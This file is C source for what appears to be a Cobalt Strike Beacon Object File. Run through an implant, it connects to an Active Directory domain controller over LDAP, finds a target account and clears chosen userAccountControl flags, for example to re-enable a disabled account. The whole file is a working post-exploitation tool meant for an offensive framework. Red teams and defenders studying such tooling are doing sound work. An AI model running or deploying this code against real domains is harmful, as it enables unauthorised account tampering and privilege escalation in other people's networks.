#include <windows.h>
#include "../../_include/beacon.h"
#include "../common/ldap_common.c"

DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char* buffer, size_t count, const char* format, ...);
DECLSPEC_IMPORT long __cdecl MSVCRT$strtol(const char* str, char** endptr, int base);

typedef struct {
    const char* name;
    DWORD value;
} UAC_FLAG_MAP;

static const UAC_FLAG_MAP uacFlags[] = {
    {"SCRIPT", UF_SCRIPT},
    {"ACCOUNTDISABLE", UF_ACCOUNTDISABLE},
    {"HOMEDIR_REQUIRED", UF_HOMEDIR_REQUIRED},
    {"LOCKOUT", UF_LOCKOUT},
    {"PASSWD_NOTREQD", UF_PASSWD_NOTREQD},
    {"PASSWD_CANT_CHANGE", UF_PASSWD_CANT_CHANGE},
    {"ENCRYPTED_TEXT_PWD_ALLOWED", UF_ENCRYPTED_TEXT_PWD_ALLOWED},
    {"TEMP_DUPLICATE_ACCOUNT", UF_TEMP_DUPLICATE_ACCOUNT},
    {"NORMAL_ACCOUNT", UF_NORMAL_ACCOUNT},
    {"INTERDOMAIN_TRUST_ACCOUNT", UF_INTERDOMAIN_TRUST_ACCOUNT},
    {"WORKSTATION_TRUST_ACCOUNT", UF_WORKSTATION_TRUST_ACCOUNT},
    {"SERVER_TRUST_ACCOUNT", UF_SERVER_TRUST_ACCOUNT},
    {"DONT_EXPIRE_PASSWD", UF_DONT_EXPIRE_PASSWD},
    {"MNS_LOGON_ACCOUNT", UF_MNS_LOGON_ACCOUNT},
    {"SMARTCARD_REQUIRED", UF_SMARTCARD_REQUIRED},
    {"TRUSTED_FOR_DELEGATION", UF_TRUSTED_FOR_DELEGATION},
    {"NOT_DELEGATED", UF_NOT_DELEGATED},
    {"USE_DES_KEY_ONLY", UF_USE_DES_KEY_ONLY},
    {"DONT_REQ_PREAUTH", UF_DONT_REQ_PREAUTH},
    {"PASSWORD_EXPIRED", UF_PASSWORD_EXPIRED},
    {"TRUSTED_TO_AUTH_FOR_DELEGATION", UF_TRUSTED_TO_AUTH_FOR_DELEGATION},
    {"NO_AUTH_DATA_REQUIRED", UF_NO_AUTH_DATA_REQUIRED},
    {"PARTIAL_SECRETS_ACCOUNT", UF_PARTIAL_SECRETS_ACCOUNT},
    {NULL, 0}
};

DWORD ParseUACFlags(const char* flagString) {
    if (!flagString || MSVCRT$strlen(flagString) == 0) return 0;
    DWORD result = 0;
    char buffer[512];
    MSVCRT$_snprintf(buffer, sizeof(buffer), "%s", flagString);

    char* token = buffer;
    char* next = buffer;

    while (*next) {
        while (*next && *next != ',') next++;
        char savedChar = *next;
        *next = '\0';

        while (*token == ' ' || *token == '\t') token++;
        char* end = token + MSVCRT$strlen(token) - 1;
        while (end > token && (*end == ' ' || *end == '\t')) {
            *end = '\0';
            end--;
        }

        if (MSVCRT$strlen(token) > 0) {
            for (int i = 0; uacFlags[i].name != NULL; i++) {
                if (MSVCRT$strcmp(token, uacFlags[i].name) == 0) {
                    result |= uacFlags[i].value;
                    break;
                }
            }
        }

        if (savedChar) {
            *next = savedChar;
            next++;
            token = next;
        } else {
            break;
        }
    }
    return result;
}

void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    char* targetIdentifier = ValidateInput(BeaconDataExtract(&parser, NULL));
    int isTargetDN = BeaconDataInt(&parser);
    char* flagsValue = ValidateInput(BeaconDataExtract(&parser, NULL));
    char* searchOu = ValidateInput(BeaconDataExtract(&parser, NULL));
    char* dcAddress = ValidateInput(BeaconDataExtract(&parser, NULL));
    int useLdaps = BeaconDataInt(&parser);

    if (!targetIdentifier || MSVCRT$strlen(targetIdentifier) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Target identifier is required");
        return;
    }

    if (!flagsValue || MSVCRT$strlen(flagsValue) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Flags are required (e.g., DONT_REQ_PREAUTH,ACCOUNTDISABLE)");
        return;
    }

    DWORD flagsToRemove = ParseUACFlags(flagsValue);
    if (flagsToRemove == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No valid flags parsed");
        return;
    }

    // Safety check: warn if trying to remove account type flags
    if (flagsToRemove & UF_ACCOUNT_TYPE_MASK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] WARNING: Cannot remove account type flags!");
        BeaconPrintf(CALLBACK_ERROR, "[!] This would corrupt the account.");
        return;
    }

    char* dcHostname = NULL;
    LDAP* ld = InitializeLDAPConnection(dcAddress, useLdaps, &dcHostname);
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize LDAP connection");
        return;
    }

    char* defaultNC = NULL;
    if (!isTargetDN) {
        defaultNC = GetDefaultNamingContext(ld, dcHostname);
        if (!defaultNC) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get default naming context");
            if (dcHostname) MSVCRT$free(dcHostname);
            CleanupLDAP(ld);
            return;
        }
    }

    char* targetDN = NULL;
    if (isTargetDN) {
        size_t len = MSVCRT$strlen(targetIdentifier) + 1;
        targetDN = (char*)MSVCRT$malloc(len);
        if (targetDN) MSVCRT$strcpy(targetDN, targetIdentifier);
    } else {
        char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
        targetDN = FindObjectDN(ld, targetIdentifier, searchBase);
        if (!targetDN) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Target '%s' not found", targetIdentifier);
            if (defaultNC) MSVCRT$free(defaultNC);
            if (dcHostname) MSVCRT$free(dcHostname);
            CleanupLDAP(ld);
            return;
        }
    }

    // Get current UAC value
    LDAPMessage* searchResult = NULL;
    char* attrs[] = { "userAccountControl", NULL };
    ULONG result = WLDAP32$ldap_search_s(ld, targetDN, LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &searchResult);

    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read current UAC");
        MSVCRT$free(targetDN);
        if (defaultNC) MSVCRT$free(defaultNC);
        if (dcHostname) MSVCRT$free(dcHostname);
        CleanupLDAP(ld);
        return;
    }

    DWORD currentUAC = 0;
    LDAPMessage* entry = WLDAP32$ldap_first_entry(ld, searchResult);
    if (entry) {
        char** values = WLDAP32$ldap_get_values(ld, entry, "userAccountControl");
        if (values && values[0]) {
            currentUAC = (DWORD)MSVCRT$strtol(values[0], NULL, 10);
            WLDAP32$ldap_value_free(values);
        }
    }
    WLDAP32$ldap_msgfree(searchResult);

    DWORD newUAC = currentUAC & ~flagsToRemove;

    char uacString[32];
    MSVCRT$_snprintf(uacString, sizeof(uacString), "%lu", newUAC);

    char* uac_values[] = { uacString, NULL };
    LDAPModA uac_mod;
    uac_mod.mod_op = LDAP_MOD_REPLACE;
    uac_mod.mod_type = "userAccountControl";
    uac_mod.mod_vals.modv_strvals = uac_values;

    LDAPModA* mods[] = { &uac_mod, NULL };

    result = WLDAP32$ldap_modify_s(ld, targetDN, mods);

    if (result == LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully removed UAC flags");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to modify UAC");
        PrintLdapError("Modify UAC", result);
    }

    MSVCRT$free(targetDN);
    if (defaultNC) MSVCRT$free(defaultNC);
    if (dcHostname) MSVCRT$free(dcHostname);
    CleanupLDAP(ld);
}
